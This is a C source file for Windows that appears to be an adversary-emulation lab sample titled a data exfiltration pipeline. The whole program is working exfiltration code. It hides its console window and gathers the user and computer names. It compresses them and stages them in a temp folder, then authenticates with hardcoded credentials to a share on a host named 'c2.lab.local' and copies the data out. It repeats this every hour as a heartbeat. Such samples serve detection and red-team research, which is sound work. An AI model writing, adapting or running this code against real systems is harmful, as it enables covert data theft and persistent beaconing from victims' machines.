/*
   A04_4d: Data Exfiltration Pipeline (Staging + Compression + Direct UNC Auth Variant)
   Behavioral Scope: Local metric aggregation, native memory compression, direct UNC authenticated SMB upload.
*/

#include <windows.h>
#include <compressapi.h> // Required for native Windows compression
#include <winnetwk.h>    // Required for WNetAddConnection2A / SMB Authentication
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

#pragma comment(lib, "advapi32.lib") // Required for GetUserNameA
#pragma comment(lib, "user32.lib")   // Required for ShowWindow and GetConsoleWindow
#pragma comment(lib, "cabinet.lib")  // Required for CreateCompressor / Compress
#pragma comment(lib, "mpr.lib")      // Required for WNetAddConnection2A / WNetCancelConnection2A

// Laboratory Configuration Constraints
const char *LOCAL_STAGE_PATH = "C:\\Windows\\Temp\\stage.lz";
const char *REMOTE_SMB_SHARE = "\\\\c2.lab.local\\sharestage\\report.lz";
const char *REMOTE_SMB_REMOTE = "\\\\c2.lab.local\\sharestage"; // Root share path for authentication

// Credentials Profile
const char *SMB_USER = "smbuser";
const char *SMB_PASSWORD = "LabPassword123";

// Global Structural Telemetry Containers
char username[256] = {0};
char computer_name[256] = {0};

void gather_static_identity()
{
    DWORD size = sizeof(username);
    if (!GetUserNameA(username, &size))
    {
        strcpy_s(username, sizeof(username), "Unknown_User");
    }

    size = sizeof(computer_name);
    if (!GetComputerNameA(computer_name, &size))
    {
        strcpy_s(computer_name, sizeof(computer_name), "Unknown_Host");
    }
}

void get_timestamp(char *buffer, size_t buffer_size)
{
    time_t rawtime;
    struct tm timeinfo;
    time(&rawtime);
    localtime_s(&timeinfo, &rawtime);
    strftime(buffer, buffer_size, "%Y-%m-%d %H:%M:%S", &timeinfo);
}

BYTE *compress_payload(const char *input_data, DWORD input_size, DWORD *compressed_size)
{
    COMPRESSOR_HANDLE compressor = NULL;
    BYTE *compressed_buffer = NULL;
    SIZE_T required_buffer_size = 0;

    // Adding COMPRESS_RAW strips all proprietary Microsoft headers and outputs standard Deflate
    if (!CreateCompressor(COMPRESS_ALGORITHM_MSZIP | COMPRESS_RAW, NULL, &compressor))
    {
        printf("[ERROR] CreateCompressor failed. Error: %lu\n", GetLastError());
        return NULL;
    }

    if (!Compress(compressor, (PVOID)input_data, input_size, NULL, 0, &required_buffer_size))
    {
        DWORD error = GetLastError();
        if (error != ERROR_INSUFFICIENT_BUFFER)
        {
            printf("[ERROR] Sizing compression buffer failed. Error: %lu\n", error);
            CloseCompressor(compressor);
            return NULL;
        }
    }

    compressed_buffer = (BYTE *)malloc(required_buffer_size);
    if (compressed_buffer == NULL)
    {
        printf("[ERROR] Failed to allocate compression buffer memory.\n");
        CloseCompressor(compressor);
        return NULL;
    }

    SIZE_T actual_compressed_size = 0;
    if (!Compress(compressor, (PVOID)input_data, input_size, (PVOID)compressed_buffer, required_buffer_size, &actual_compressed_size))
    {
        printf("[ERROR] Compression execution failed. Error: %lu\n", GetLastError());
        free(compressed_buffer);
        CloseCompressor(compressor);
        return NULL;
    }

    *compressed_size = (DWORD)actual_compressed_size;
    CloseCompressor(compressor);
    return compressed_buffer;
}

void stage_and_exfiltrate_compressed(const char *raw_payload)
{
    DWORD raw_size = (DWORD)strlen(raw_payload);
    DWORD compressed_size = 0;

    // 1. Compress the JSON payload stream in memory
    BYTE *compressed_data = compress_payload(raw_payload, raw_size, &compressed_size);
    if (compressed_data == NULL)
    {
        printf("[ERROR] Aborting exfiltration pipeline due to compression failure\n");
        return;
    }

    // 2. Staging Phase: Write the binary compressed payload to disk
    HANDLE hFile = CreateFileA(
        LOCAL_STAGE_PATH,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("[ERROR] Failed to open local staging file. Error: %lu\n", GetLastError());
        free(compressed_data);
        return;
    }

    DWORD bytes_written = 0;
    BOOL bWrite = WriteFile(hFile, compressed_data, compressed_size, &bytes_written, NULL);
    CloseHandle(hFile);
    free(compressed_data);

    if (bWrite)
    {
        printf("[INFO] Successfully compressed and staged locally (%lu bytes written)\n", bytes_written);
    }
    else
    {
        printf("[ERROR] Failed writing to local archive. Error: %lu\n", GetLastError());
        return;
    }

    // 3. Pre-emptively clear any existing connections to this specific remote resource path
    WNetCancelConnection2A(REMOTE_SMB_REMOTE, 0, TRUE);

    // 4. Authenticated SMB Phase: Initialize NETRESOURCEA for direct UNC authentication
    NETRESOURCEA nr = {0};
    nr.dwType = RESOURCETYPE_DISK;
    nr.lpLocalName = NULL;                      // Explicitly NULL: Bypasses local volume mapping logic completely
    nr.lpRemoteName = (LPSTR)REMOTE_SMB_REMOTE; // Target root share
    nr.lpProvider = NULL;

    printf("[INFO] Attempting direct UNC authentication to %s...\n", REMOTE_SMB_REMOTE);
    DWORD dwNetRet = WNetAddConnection2A(&nr, SMB_PASSWORD, SMB_USER, 0);

    // Verify session credential errors
    if (dwNetRet == ERROR_SESSION_CREDENTIAL_CONFLICT)
    {
        printf("[ERROR] Existing SMB session uses different credentials. Run: net use * /delete /y\n");
        return;
    }
    else if (dwNetRet != NO_ERROR)
    {
        printf("[ERROR] SMB authentication failed. Error Code: %lu\n", dwNetRet);
        return;
    }
    printf("[INFO] Remote UNC path authenticated successfully.\n");

    // 5. Transmission Phase: Copy file directly via specific static UNC naming configurations
    BOOL bCopy = CopyFileA(LOCAL_STAGE_PATH, REMOTE_SMB_SHARE, FALSE);
    if (bCopy)
    {
        printf("[INFO] Compressed archive transfer via explicit UNC path successful: %s\n", REMOTE_SMB_SHARE);
    }
    else
    {
        printf("[ERROR] File transfer to UNC path failed. Error: %lu\n", GetLastError());
    }

    // 6. Cleanup Phase: Terminate connection context session windows cleanly
    DWORD dwDelRet = WNetCancelConnection2A(REMOTE_SMB_REMOTE, 0, TRUE);
    if (dwDelRet == NO_ERROR)
    {
        printf("[INFO] Authenticated remote session successfully dropped.\n");
    }
    else
    {
        printf("[WARNING] Failed to drop remote session window cleanly. Error Code: %lu\n", dwDelRet);
    }
}

void log_login_info()
{
    char time_buffer[64] = {0};
    char json_buffer[1024] = {0};
    get_timestamp(time_buffer, sizeof(time_buffer));

    sprintf_s(json_buffer, sizeof(json_buffer),
              "{\"username\":\"%s\",\"computer_name\":\"%s\",\"login_time\":\"%s\"}",
              username, computer_name, time_buffer);

    stage_and_exfiltrate_compressed(json_buffer);
}

void log_location()
{
    char time_buffer[64] = {0};
    char json_buffer[1024] = {0};
    get_timestamp(time_buffer, sizeof(time_buffer));

    sprintf_s(json_buffer, sizeof(json_buffer),
              "{\"username\":\"%s\",\"computer_name\":\"%s\",\"status\":\"location_heartbeat\",\"time\":\"%s\"}",
              username, computer_name, time_buffer);

    stage_and_exfiltrate_compressed(json_buffer);
}

DWORD WINAPI PipelineWorkerThread(LPVOID lpParam)
{
    while (TRUE)
    {
        log_location();
        Sleep(3600000); // Wait exactly 1 hour
    }
    return 0;
}

int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    gather_static_identity();
    log_login_info();

    HANDLE hThread = CreateThread(NULL, 0, PipelineWorkerThread, NULL, 0, NULL);
    if (hThread == NULL)
    {
        printf("[ERROR] CreateThread failed. Error: %lu\n", GetLastError());
        return 1;
    }

    printf("[INFO] Staging + Compression + Direct UNC SMB pipeline running\n");

    while (TRUE)
    {
        Sleep(10000);
    }

    CloseHandle(hThread);
    return 0;
}